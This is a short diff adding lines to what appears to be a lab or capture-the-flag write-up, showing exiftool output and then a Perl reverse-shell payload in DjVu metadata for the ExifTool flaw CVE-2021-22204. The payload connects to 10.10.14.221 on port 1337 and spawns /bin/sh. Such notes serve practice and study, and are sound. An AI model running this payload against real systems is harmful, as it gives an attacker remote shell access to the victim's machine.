@@ -184,3 +184,8 @@ Color Components                : 3
 Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 ````
 
+* I`ve tried many reverse shell options w/out success, searching I found this one (https://github.com/AssassinUKG/CVE-2021-22204)
+
+````
+(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(1337,inet_aton('10.10.14.221')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#")
+````
